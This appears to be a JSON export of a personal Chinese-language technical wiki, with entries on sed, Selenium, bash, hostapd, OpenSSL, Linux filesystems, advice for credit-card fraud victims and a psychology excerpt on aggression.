s/RE1/RE2/”这种在's'前带有空格的命令，但这些版本中有些却不接受这样的命令:“/one/! s/RE1/RE2/”。这时只需要把中间的空格去掉就行了。速度优化：当由于某种原因（比如输入文件较大、处理器或硬盘较慢等）需要提高命令执行速度时，可以考虑在替换命令（“s/.../.../”）前面加上地址表达式来提高速度。举例来说： sed 's/foo/bar/g' filename # 标准替换命令 sed '/foo/ s/foo/bar/g' filename # 速度更快 sed '/foo/ s//bar/g' filename # 简写形式当只需要显示文件的前面的部分或需要删除后面的内容时，可以在脚本中使用“q”命令（退出命令）。在处理大的文件时，这会节省大量时间。因此： sed -n '45,50p' filename # 显示第45到50行 sed -n '51q;45,50p' filename # 一样，但快得多如果你有其他的单行脚本想与大家分享或者你发现了本文档中错误的地方，请发电子邮件给本文档的作者（Eric Pement）。邮件中请记得提供你所使用的sed版本、 该sed所运行的操作系统及对问题的适当描述。本文所指的单行脚本指命令行的长度在65个字符或65个以下的sed脚本〔译注1〕。本文档的各种脚本是由以下所列作者所写或提供： Al Aab # 建立了“seders”邮件列表 Edgar Allen # 许多方面 Yiorgos Adamopoulos # 许多方面 Dale Dougherty # 《sed & awk》作者 Carlos Duarte # 《do it with sed》作者 Eric Pement # 本文档的作者 Ken Pizzini # GNU sed v3.02 的作者 S.G. Ravenhall # 去html标签脚本 Greg Ubben # 有诸多贡献并提供了许多帮助​-------------------------------------------------------------------------译注1：大部分情况下，sed脚本无论多长都能写成单行的形式（通过`-e'选项和`;'号）——只要命令解释器支持，所以这里说的单行脚本除了能写成一行还对长度有所限制。因为这些单行脚本的意义不在于它们是以单行的形式出现。而是让用户能方便地在命令行中使用这些紧凑的脚本才是其意义所在。 sed命令详解 via: http://qifuguang.me/2015/09/21/sed命令详解/ sed是stream editor的简称，也就是流编辑器。它一次处理一行内容，处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。 使用语法sed命令的使用规则是这样的：sed [option] 'command' input_file 其中option是可选的，常用的option有如下几种： -n 使用安静(silent)模式（想不通为什么不是-s）。在一般sed的用法中，所有来自stdin的内容一般都会被列出到屏幕上。但如果加上-n参数后，则只有经过sed特殊处理的那一行(或者动作)才会被列出来； -e 直接在指令列模式上进行 sed 的动作编辑； -f 直接将 sed 的动作写在一个文件内， -f filename 则可以执行filename内的sed命令； -r 让sed命令支持扩展的正则表达式(默认是基础正则表达式)； -i 直接修改读取的文件内容，而不是由屏幕输出。 常用的命令有以下几种： a： append即追加字符串， a的后面跟上字符串s(多行字符串可以用\\n分隔)，则会在当前选择的行的后面都加上字符串s； c： 取代/替换字符串，c后面跟上字符串s(多行字符串可以用\\n分隔)，则会将当前选中的行替换成字符串s； d： delete即删除，该命令会将当前选中的行删除； i： insert即插入字符串，i后面跟上字符串s(多行字符串可以用\\n分隔)，则会在当前选中的行的前面都插入字符串s； p： print即打印，该命令会打印当前选择的行到屏幕上； s： 替换，通常s命到第三行写成1令的用法是这样的：1,2s/old/new/g，将old字符串替换成new字符串 命令示例假设有一个本地文件test.txt，文件内容如下： 12345678[qifuguang@winwill~]$ cat test.txtthis is first linethis is second linethis is third linethis is fourth linethis fifth linehappy everydayend 本节将使用该文件详细演示每一个命令的用法。 a命令123456789[qifuguang@winwill~]$ sed '1a \\add one' test.txtthis is first lineadd onethis is second linethis is third linethis is fourth linethis is fifth linehappy everydayend 本例命令部分中的1表示第一行，同样的第二行写成2，第一行到第三行写成1,3，用$表示最后一行，比如2,$表示第二行到最后一行中间所有的行(包含第二行和最后一行)。本例的作用是在第一行之后增加字符串add one，从输出可以看到具体效果。 123456789101112131415[qifuguang@winwill~]$ sed '1,$a \\add one' test.txtthis is first lineadd onethis is second lineadd onethis is third lineadd onethis is fourth lineadd onethis is fifth lineadd onehappy everydayadd oneendadd one 本例表示在第一行和最后一行所有的行后面都加上add one字符串，从输出可以看到效果。 123456789[qifuguang@winwill~]$ sed '/first/a \\add one' test.txtthis is first lineadd onethis is second linethis is third linethis is fourth linethis is fifth linehappy everydayend 本例表示在包含first字符串的行的后面加上字符串add one，从输出可以看到第一行包含first，所以第一行之后增加了add one 123456789[qifuguang@winwill~]$ sed '/^ha.*day$/a \\add one' test.txtthis is first linethis is second linethis is third linethis is fourth linethis is fifth linehappy everydayadd oneend 本例使用正则表达式匹配行，^ha.*day$表示以ha开头，以day结尾的行，则可以匹配到文件的happy everyday这样，所以在该行后面增加了add one字符串。 i命令i命令使用方法和a命令一样的，只不过是在匹配的行的前面插入字符串，所以直接将上面a命令的示例的a替换成i即可，在此就不啰嗦了。 c命令12345678[qifuguang@winwill~]$ sed '$c \\add one' test.txtthis is first linethis is second linethis is third linethis is fourth linethis is fifth linehappy everydayadd one 本例表示将最后一行替换成字符串add one，从输出可以看到效果。 12345[qifuguang@winwill~]$ sed '4,$c \\add one' test.txtthis is first linethis is second linethis is third lineadd one 本例将第四行到最后一行的内容替换成字符串add one。 12345678[qifuguang@winwill~]$ sed '/^ha.*day$/c \\replace line' test.txtthis is first linethis is second linethis is third linethis is fourth linethis is fifth linereplace lineend 本例将以ha开头，以day结尾的行替换成replace line。 d命令1234567[qifuguang@winwill~]$ sed '/^ha.*day$/d' test.txtthis is first linethis is second linethis is third linethis is fourth linethis is fifth lineend 本例删除以ha开头，以day结尾的行。 1234[qifuguang@winwill~]$ sed '4,$d' test.txtthis is first linethis is second linethis is third line 本例删除第四行到最后一行中的内容。 p命令12345[qifuguang@winwill~]$ sed -n '4,$p' test.txtthis is fourth linethis is fifth linehappy everydayend 本例在屏幕上打印第四行到最后一行的内容，p命令一般和-n选项一起使用。 12[qifuguang@winwill~]$ sed -n '/^ha.*day$/p' test.txthappy everyday 本例打印以ha开始，以day结尾的行。 s命令实际运用中s命令是最常使用到的。 12345678[qifuguang@winwill~]$ sed 's/line/text/g' test.txtthis is first textthis is second textthis is third textthis is fourth textthis is fifth texthappy everydayend 本例将文件中的所有line替换成text，最后的g是global的意思，也就是全局替换，如果不加g，则只会替换本行的第一个line。 12345678[qifuguang@winwill~]$ sed '/^ha.*day$/s/happy/very happy/g' test.txtthis is first linethis is second linethis is third linethis is fourth linethis is fifth linevery happy everydayend 本例首先匹配以ha开始，以day结尾的行，本例中匹配到的行是happy everyday这样，然后再将该行中的happy替换成very happy。 12345678[qifuguang@winwill~]$ sed 's/\\(.*\\)line$/\\1/g' test.txtthis is firstthis is secondthis is thirdthis is fourththis is fifthhappy everydayend 这个例子有点复杂，先分解一下。首先s命令的模式是s/old/new/g这样的，所以本例的old部分即\\(.*\\)line$,sed命令中使用\\(\\)包裹的内容表示正则表达式的第n部分，序号从1开始计算，本例中只有一个\\(\\)所以\\(.*\\)表示正则表达式的第一部分，这部分匹配任意字符串，所以\\(.*\\)line$匹配的就是以line结尾的任何行。然后将匹配到的行替换成正则表达式的第一部分（本例中相当于删除line部分），使用\\1表示匹配到的第一部分，同样\\2表示第二部分，\\3表示第三部分，可以依次这样引用。比如下面的例子： 12345678[qifuguang@winwill~]$ sed 's/\\(.*\\)is\\(.*\\)line/\\1\\2/g' test.txtthis firstthis secondthis thirdthis fourththis fifthhappy everydayend 正则表达式中is两边的部分可以用\\1和\\2表示，该例子的作用其实就是删除中间部分的is。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"信用卡被盗刷怎么办","date":"2019-08-25T00:00:00.000Z","path":"wiki/日常/信用卡被盗刷怎么办/","text":"via: @ACG青年初号君 有同学银行卡被异地盗刷了，谈谈如何保留证据的问题。 起因是一个老同学突然打电话给我，火急火燎地说自己的银行卡突然被在云南刷了好几万块钱，但是自己人在上海，卡也在身边，怎么办怎么办。我说务必冷静，只要根据我说的做，保你没事。我也是身经百战了，这种情况是很常见的“伪卡交易”。遭遇“伪卡交易”的原因有很多，以前用磁条卡的时候银行的人认为换了芯片卡能防止“伪卡交易”问题，但事实证明换了芯片卡之后这类事件仍然存在。现在不法分子的高科技手段层出不穷，而且很多不法分子在境外或者边境地区活动，也很难抓获，所以很难完全查明到底是如何偷梁换柱把你的钱刷走的。因此严格来讲，这种事每个人都有中招的可能性，千万不能以为这类事情跟自己无关。好消息是，“伪卡交易”是完全可以通过诉讼把钱要回来的，但前提是你懂得保留证据。每年有很多很多这类案子到法院，都是储户起诉银行，说自己的卡被在异地盗刷了，要求银行承担责任。这类官司有些是储户赢了，有些是银行赢了，关键点就在于当事人懂不懂得如何保留证据。常见的误区在于，很多人认为关键是证明“卡不是我刷的”，这是错的！卡不是你刷的不代表银行就要赔钱：你把自己的卡跟密码告诉你爹，让你爹去云南刷卡，然后你去要求银行赔钱，银行会赔你吗？当然不会啦！所以其实证明的关键是“伪卡交易”！反过来讲，就是证明你手上的是真卡！ 99%的“伪卡交易”案件，都有一个相似的开局：某日深夜张三在上海的家里，突然手机收到银行的短信通知，自己的银行卡在云南分几次在POS机上被刷了15万块钱（这个交易地点可以换成贵州、东南亚某国、美国等等）。张三摸不着头脑，翻了一下包看到银行卡还好好地在钱包里，聪明的张三马上意识到：哎哟卧槽，我被盗刷了。眼看搬砖几年存下的钱人间蒸发了，张三嗷地一声崩溃了。此时张三应该怎么办呢？ 第一步：立即电话联系银行。首先查清楚这个交易提示是不是真的，自己的卡里还剩下多少钱。如果交易提示确实是真的，卡里还有钱的话，立即要求挂失账户（如果已经没钱的话挂不挂失也无所谓了，多数都是没钱的，毕竟犯罪分子不会跟你这么客气）。 第二步：立即报警。带着身份证件和银行卡去就近派出所，务必出示银行卡，然后把事情跟警察叔叔说了，让派出所给你开个报警回执，证明这个时间点卡在你手上（有经验的警察也是身经百战了，会很熟练地给你开个回执。如果不行的话必须另想办法证明这个时间点卡在你手上。） 第三步：立即去就近的ATM机，用手上的卡进行一些操作，留下操作记录。常见的操作是往卡里存一点钱，然后再取出。（顺便被挂失的卡进行操作也会留下记录。）这一步的目的是证明这个时间点你手上的是真卡！这个很关键。因为报警回执只能证明你手上有一张卡，至于是真卡还是伪卡用肉眼是无法判断的，所以必须经过ATM机操作。操作过程最好全程录像，警察愿意跟你一起去最好。 经过以上三步，基本上你就稳了。下一步去跟银行协商，如果银行要求你走司法途径，那就去法院起诉。一般证据保留到这个地步，银行也知道你小子不是个善茬，有可能会同意调解。当然有些银行规定一定要拿判决书，那也无所谓，你举证到这份上，判决肯定也是有利于你的。 这事写出来，希望大家能有所帮助，这种事情其实真的挺多的，算是有备无患吧。另外钱比较多的银卡，记得开个银行交易短信提示真的很重要，几乎99%的盗刷都是因为短信提示才被及时发现的，没开的赶紧开吧。","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"}]},{"title":"脑机接口BCI","date":"2019-08-25T00:00:00.000Z","path":"wiki/杂学/脑机接口bci/","text":"wiki： https://en.wikipedia.org/wiki/Brain%E2%80%93computer_interface 开源社区比较火的项目： https://openbci.com 淘宝上的16通道的“脑电帽”可以在千元买到，开发门槛似乎已经挺低了","tags":[],"categories":[{"name":"杂学","slug":"杂学","permalink":"http://wiki.noodlefighter.com/categories/杂学/"}]},{"title":"selenium","date":"2019-08-25T00:00:00.000Z","path":"wiki/计算机/前端技术/tools/selenium/","text":"selenium是个浏览器自动化工具，操作例如Chrome的headless模式、PhantomJS（本身就是headless的，已停止开发）等浏览器。 github: https://github.com/SeleniumHQ/selenium docs: https://seleniumhq.github.io/docs/index.html Selenium使用Headless Chrome浏览器 via: https://stackoverflow.com/questions/46920243/how-to-configure-chromedriver-to-initiate-chrome-browser-in-headless-mode-throug 1234567891011from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsoptions = Options()options.add_argument(\"--headless\") # Runs Chrome in headless mode.options.add_argument('--no-sandbox') # # Bypass OS security modeloptions.add_argument('start-maximized')options.add_argument('disable-infobars')options.add_argument(\"--disable-extensions\")driver = webdriver.Chrome(options=options)print (\"Headless Chrome Initialized on Linux OS\") 还有建议用chromedriver的，在生产环境该用它吧。 使用Python+Selenium对某元素截图 via: https://www.jianshu.com/p/7ed519854be7 123456789101112131415from selenium import webdriverfrom PIL import Imagedriver = webdriver.Chrome()driver.get('http://stackoverflow.com/')driver.save_screenshot('screenshot.png')left = element.location['x']top = element.location['y']right = element.location['x'] + element.size['width']bottom = element.location['y'] + element.size['height']im = Image.open('screenshot.png') im = im.crop((left, top, right, bottom))im.save('screenshot.png') Selenium使用cookies1234567brower.add_cookie({ \"domain\":\".taobao.com\", \"name\":\"xxx\", \"value\":\"xxx\", \"path\":'/', \"expires\":None})","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"前端技术","slug":"计算机/前端技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/前端技术/"},{"name":"tools","slug":"计算机/前端技术/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/前端技术/tools/"}]},{"title":"空间取电","date":"2019-08-18T00:00:00.000Z","path":"wiki/电子工程/IoT/空间取电/","text":"想弄个从空间wifi信号中取电的东西。 类似MIT做的那个“不用充电的手机”。 但有常见的实现，叫“来电闪”，DIY制作如视频： https://www.youtube.com/watch?v=FvvQZgBPGt8 材料：检波二极管1ss99（高频100M以上） 问题在空间中可用能量有多少、能量怎么存储、能支持多高用电量的设备。","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"IoT","slug":"电子工程/IoT","permalink":"http://wiki.noodlefighter.com/categories/电子工程/IoT/"}]},{"title":"加壳和压缩","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/devtools/加壳和压缩/","text":"UPX压缩可执行文件，开Level 9高压缩： 1$ upx abc.out -9","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux文件系统","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/linux文件系统/","text":"Linux下的Union文件系统 SquashFS只读部分镜象+可读写部分的层次叠加文件系统https://fadeer.github.io/%E5%B7%A5%E4%BD%9C/2015/08/07/linux-union-filesystem.html linux文件系统Overlayfs机制Overlayfs = Overlay filesystem. linux在文件系统上 arch的wiki: https://wiki.archlinux.org/index.php/Overlay_filesystem kernel的git commit: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e9be9d5e76e34872f0c37d72e25bc27fe9e2c54c Overlayfs允许一个通常是读写的目录树 覆盖到另一个只读目录树上。所有的修改会在上面的可写层。这样的机制最常用于Live CD，但还有很多其他用途。 该实现与其他“union filesystem”实现的不同之处在于，在打开文件之后，所有操作都直接进入底层的lower层或upper层文件系统。这简化了实现，并在这些情况下允许本机性能。 Overlayfs在出现在linux内核3.18之后。 linux下mount ntfs分区只读的问题写入文件提示read only，需要安装ntfs-3g包才能获得完整的读写支持。 SquashFSHowTo: https://www.tldp.org/HOWTO/html_single/SquashFS-HOWTO/ Format: https://dr-emann.github.io/squashfs/#superblock","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"bash","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/bash/","text":"CLI下方便的操作、相关工具。 基本操作应用挂起、恢复ctrl+z挂起命令fg恢复 快捷操作1ctrl+u ctrl+k 光标处往前删除/光标处往后删除 命令小技巧12# 返回上一个目录cd - pushd,popd命令pushd：当前目录入目录栈，并进入到指定的目录popd：跳转到目录栈顶部弹出的目录 bd工具https://linux.cn/article-8491-1.html https://github.com/vigneshwaranr/bd 12345678bd # 比如当前目录是/d/tools/android-sdk-tools/tools/lib/x86# 想要导航到tools目录，输入：bd too# 还可以这样获取路径，比如ls `bd too` autojump工具https://linux.cn/article-5983-1.html 工具会记录下cd过的路径，不用输入完整路径即可快速导航。123cd /etc/local/cd /homej local 给less加高亮显示 装source-highlight 修改~/.bashrc: 123PAGER='less -X -M'export LESSOPEN=\"| /usr/share/source-highlight/src-hilite-lesspipe.sh %s\"export LESS=' -R 测试 less -N abc.c 让less颜色不消失的方法https://qiita.com/mkasahara/items/60049ee20956e835738b 经常要用到例如ls |less，但会发现怎颜色消失了 1ls -al --color=always | less -R 文中提到了用expect工具包中的unbuffer能解决，但实际使用发现无效。 为了方便使用, 在.bashrc里加入: 1alias ll=\"ls -lh --color=always|less -R\" set命令可以控制bash的行为，比如set -e使脚本在错误时退出bash。 set +e 可以取消 查看帮助用help set命令： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667-a allexport Flag variables for export when assignments are made to them.-b notify Enable asynchronous notification of background job completion. (UNIMPLEMENTED)-C noclobber Do not overwrite existing files with ``>''.-E emacs Enable the built-in emacs(1) command line editor (disables the -V option if it has been set).-e errexit 脚本遇错时退出-f noglob Disable pathname expansion.-I ignoreeof Ignore EOF's from input when in interactive mode.-i interactive 强制shell表现为交互式的-m monitor Turn on job control (set automatically when interactive).-n noexec If not interactive, read commands but do not execute them. This is useful for checking the syntax of shell scripts.-P physical Change the default for the cd and pwd commands from -L (logical directory layout) to -P (physical directory layout).-p privileged Turn on privileged mode. This mode is enabled on startup if either the effective user or group id is not equal to the real user or group id. Turning this mode off sets the effective user and group ids to therealuserand=groupids. When this mode is enabled for interactive shells, the file /etc/suid_profile is sourced instead of ~/.profile after /etc/profile is sourced, and the contents of the ENV variable are ignored.-s stdin Read commands from standard input (set automatically if no file arguments are present). This option has no effect when set after the shell has already started running (i.e., when set with the set command).-T trapsasync When waiting for a child, execute traps immediately. If this option is not set, traps are executed after the child exits, as specified in IEEE Std 1003.2 (``POSIX.2''). This nonstandard option is useful for putting guarding shells around children that block signals. The surrounding shell may kill the child or it may just return control to the tty and leave the child alone, like this: sh -T -c \"trap 'exit 1' 2 ; some-blocking-program\"-u nounset 展开未定义的变量时，报错退出-V Vi 启用内置vi-v verbose 输出详细信息，用于debug-x 在执行每个命令前，将它打印输出 win下给cmd.exe赋予unix系sh补全特性的工具http://mridgers.github.io/clink/ 好像不怎么用得到。。毕竟win下也能用bash","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"hostapd","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/hostapd/","text":"hostapd用于开启wifi ap，执行后会创建/var/run/hostpad文件夹，hostapd_cli是用户操作界面。 123$ hostapd /etc/hostapd.conf &$ hostapd_cli -i wlan0 enable$ hostapd_cli -i wlan0 disable 用法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#!/bin/sh## Start the Hotspot....#HOSTAPD_CONF=/etc/hostapd.confHOSTAPD_CONF_DEFAULT=/rom${HOSTAPD_CONF}case \"$1\" in start) printf \"Starting Hotspot: \" # start hostpad if /var/run/hostapd not exsit if ! [ -e /var/run/hostapd ]; then hostapd $HOSTAPD_CONF > /dev/null & timeout=0 while ! [ -e /var/run/hostapd ]; do usleep 100000 let timeout++ if [ $timeout -gt 10 ]; then echo \"FAIL\" exit 1 fi done fi hostapd_cli -i wlan0 enable > /dev/null [ $? = 0 ] && echo \"OK\" || echo \"FAIL\" ;; stop) printf \"Stopping Hotspot: \" hostapd_cli -i wlan0 disable > /dev/null [ $? = 0 ] && echo \"OK\" || echo \"FAIL\" ;; ssid) if [ $# == 2 ]; then printf \"Setting Hotspot SSID: \" { sed -i \"s/^ssid=.*/ssid=$2/\" $HOSTAPD_CONF && hostapd_cli -i wlan0 set ssid \"$2\" > /dev/null && echo \"OK\" } || { # error catch echo \"FAIL\" exit 1 } \"$0\" stop killall hostapd \"$0\" start else SSID=`hostapd_cli -i wlan0 status | sed -n 's/^ssid\\[0\\]=\\(.*\\)/\\1/p'` [ -n \"${SSID}\" ] && echo $SSID || exit 1 fi ;; passwd) if [ $# == 2 ]; then printf \"Setting Hotspot PASSWD: \" { sed -i \"s/^wpa_passphrase=.*/wpa_passphrase=$2/\" $HOSTAPD_CONF && hostapd_cli -i wlan0 set wpa_passphrase \"$2\" > /dev/null && echo \"OK\" } || { # error catch echo \"FAIL\" exit 1 } \"$0\" restart else exit 1 fi ;; reset) printf \"Resetting Setting Configuration: \" cp $HOSTAPD_CONF_DEFAULT $HOSTAPD_CONF [ $? = 0 ] && echo \"OK\" || (echo \"FAIL\"; exit 1) \"$0\" stop killall hostapd \"$0\" start ;; state) STATE=`hostapd_cli -i wlan0 status | sed -n 's/^state=\\(.*\\)/\\1/p'` [ -n \"${STATE}\" ] && echo $STATE || exit 1 ;; restart|reload) \"$0\" stop \"$0\" start ;; *) echo \"Usage: $0 {start|stop|ssid|passwd|state|reset|restart}\" exit 1esacexit $? /dev/random随机数不工作导致hostapd的密码错误的问题现象：开启WEP加密后，密码错误： 123random: Cannot read from /dev/random: Resource temporarily unavailablerandom: Only 0/20 bytes of strong random data available from /dev/randomrandom: Not enough entropy pool available for secure operations 里面的0/20，多连几次可能会增加（如变成7/20/14/20），所以可能多连接几次就能连接成功了。 临时解决办法，用/dev/urandom替代： 12$ mv /dev/random /dev/random.orig$ ln -s /dev/urandom /dev/random","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"openssl","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/openssl/","text":"使用openssl进行aes加密、解密1$ openssl aes-128-cbc -K `xxd -p -c 32 ../base_key.bin` -iv `xxd -p -c 32../base_key_vi.bin` -e -nopad -nosalt -in aes_256_src_buf.bin > aes_256_src_buf-encrypt.bin 1$ openssl aes-128-cbc -K `xxd -p -c 32 ../base_key.bin` -iv `xxd -p -c 32 ../base_key_vi.bin` -d -nopad -nosalt -in aes_256_src_buf-encrypt.bin > aes_256_src_buf-decrypt.bin -K为key，-iv为IV，-e为encrypt，-d为解密，-in为文件输入 随机生成若干位的key32位，base64格式： 1$ openssl rand -base64 32 > key.bin RSA生成密钥openssh格式key转pem： 12$ openssl rsa -in id_rsa -outform pem > id_rsa.pem$ openssl rsa -in id_rsa -pubout -outform pem > id_rsa.pub.pem 生成pem格式s公/私钥： 12$ openssl genrsa -out key.pem 2048$ openssl rsa -in key.pem -pubout -outform pem > key.pub.pem 加密解密1234567891011公钥加密$ openssl rsautl -encrypt -inkey key.pub.pem -pubin -in data.bin -out data.bin.enc私钥解密$ openssl rsautl -decrypt -inkey key.pem -in data.bin.en -out data.bin私钥加密$ openssl rsautl -sign -inkey key.pem -in data.bin -out data.bin.sign公钥解密$ openssl rsautl -verify -inkey key.pub.pem -pubin -in data.bin.sign -out data.bin 公钥加密后的数据，要用私钥解密；私钥加密后的数据，要用公钥解密；但由于私钥包含公钥信息，所以实际上都能解 遇到了个坑，使用私钥加密出来的密文，无法用公钥解密： 12345这里以为用了私钥加密，但实际上openssl会自动帮你用公钥加密。。$ openssl rsautl -encrypt -inkey key.pem -in data.bin -out data.bin.enc所以当用这条，进行公钥解密时，会报错。。而用私钥就能解$ openssl rsautl -decrypt -inkey key.pub.pem -pubin -in data.bin.enc -out data.bin 签名 参考： https://jumpnowtek.com/security/Code-signing-with-openssl.html 用私钥签名(默认RSASSA PKCS1 1.5)： 1openssl dgst -sha256 -sign key.pem -out data.bin.sign data.bin 用公钥验签： 1openssl dgst -sha256 -verify key.pub.pem -signature data.bin.sign data.bin 打印rsa密钥1$ openssl rsa -in key.pem -text -noout 对应到RSA密钥里的项： 12345678modulus N项publicExponent E项privateExponent D项prime1 prime2exponent1exponent2coefficient 如何用openssl加密一个大文件 via: https://www.czeskis.com/random/openssl-encrypt-file.html Step 0) Get their public keyThe other person needs to send you their public key in .pem format. If they only have it in rsa format (e.g., they use it for ssh), then have them do: 123openssl rsa -in id_rsa -outform pem > id_rsa.pemopenssl rsa -in id_rsa -pubout -outform pem > id_rsa.pub.pem Have them send you id_rsa.pub.pem Step 1) Generate a 256 bit (32 byte) random key1openssl rand -base64 32 > key.bin Step 2) Encrypt the key1openssl rsautl -encrypt -inkey id_rsa.pub.pem -pubin -in key.bin -out key.bin.enc Step 3) Actually Encrypt our large file1openssl enc -aes-256-cbc -salt -in SECRET_FILE -out SECRET_FILE.enc -pass file:./key.bin Step 4) Send/Decrypt the filesSend the .enc files to the other person and have them do: 123openssl rsautl -decrypt -inkey id_rsa.pem -in key.bin.enc -out key.bin openssl enc -d -aes-256-cbc -in SECRET_FILE.enc -out SECRET_FILE -pass file:./key.bin NotesYou should always verify the hash of the file with the recipient or sign it with your private key, so the other person knows it actually came from you. If there is a man-in-the-middle, then he/she could substitute the other person’s public key for his/her own and then you’re screwed. Always verify the other person’s public key (take a hash and read it to each other over the phone). 证书相关参考： https://www.cnblogs.com/osbreak/p/9486188.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"start-stop-daemon","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/start-stop-daemon/","text":"start-stop-daemon是debian系下的一个工具，用于启停守护进程。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"udisks","date":"2019-08-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/udisks/","text":"udisks是linux发行版中，帮助自动挂载u盘的工具： https://wiki.archlinux.org/index.php/Udisks","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"攻击性相关","date":"2019-08-13T00:00:00.000Z","path":"wiki/心理学/攻击性相关/","text":"人格心理学: 人性及其差异的研究 攻击的理论1、本能论 Freud是攻击行为本能论的著名代表，在《文明及其不满》一书中他曾写到“攻击的倾向是人天生、独立的本能倾向。”在他看来，和人有性本能、饮食本能、防御本能一样，人也有攻击的本能。他甚至推测在人身上还有容纳这种通过遗传获得的攻击性能量的存储器，存储器中的攻击性能量迟早要释放出来的，他称之为“宣泄”。如果能量宣泄指向内部，就表现为对自我的折磨摧残，甚至自杀；若指向外部，则表现为对他人的伤害，也就是多种多样的攻击行为。 大部分现代精神分析论者也认为攻击是一种本能性的驱力，却不同意Freud所说的我们都有自我导向的死亡本能。攻击的本能性倾向可能是在我们追求需要的满足时遭到了挫折，或自我的作用因面临威胁而受到了阻碍的结果。依照这种看法，攻击驱力是好的，它可以协助个体满足基本的需求，可维护生命而非自我摧毁。 第二种攻击本能论，由动物行为学家K. Lorenz(1903～1989)提出。动物行为学家对攻击的研究是以对动物攻击行为的观察为基础，然后将研究结果推及人类的。Lorenz认为，人和动物都有攻击同种属成员的本能。如同精神分析论者一样，Lorenz视攻击为一种能自己产生能量的水压系统，他还认为，攻击的能量会不断地累积，直到有合适的释放刺激来加以解除。但什么样的刺激最易于引发攻击行为呢？这些攻击行为有什么功用？根据Lorenz的看法，所有的本能，包括攻击，都背负着一个基本的进化目的：确保个体和种属的生存。因此，在某一种动物进入另一种动物的领地时所发生的打斗是具有适应性的，这种攻击可驱赶个体至较宽广的区域，以避免因太多的成员聚集在同一个地方消耗了所有的食物而挨饿。动物也可能与入侵者打斗，以保护幼小的成员，使他们能存活下去、成熟并生养下一代。同种属 的雄性成员间也会打斗，以决定哪一位雄性可以与眼前的雌性配对。由于强壮的雄性常常赢得胜利，于是种属内部的攻击可确保最强壮的成员繁衍下一代。 但是，令人感到尴尬的是，在所有的动物中，只有人类才有如此普遍的攻击自己的同类并置同类于死地的现象。之所以会出现这种情况，本能论者认为：第一，人类所独有的巨大的攻击能力（如枪、炮弹、拷打折磨等）使得人们甚至不需要见面就可以杀死另外一个人。第二，人类没有发展出一套本能性的自我抑制，任何事件和刺激都有可能成为人类攻击的原因：仇恨、爱、金钱、国家、信仰、宗教，甚至只是受到微不足道的损害。 